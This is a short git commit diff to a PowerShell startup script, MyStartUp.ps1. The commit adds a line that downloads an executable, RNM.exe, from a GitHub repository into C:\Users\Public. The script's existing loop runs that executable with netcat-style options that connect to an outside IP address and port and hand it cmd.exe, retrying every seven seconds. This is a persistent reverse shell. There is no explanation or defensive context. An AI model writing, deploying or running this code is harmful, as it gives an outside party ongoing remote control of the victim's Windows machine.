fbc2d3f39b64d305005c2120cc0860333d27cb6b
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-08 19:44:23 +0100

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,1 +1,2 @@
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/RNM.exe -OutFile C:\Users\Public\RNM.exe
 while ($true){C:\Users\Public\RNM.exe -nv 193.161.193.99 54987 -e cmd.exe ; Start-Sleep 7}
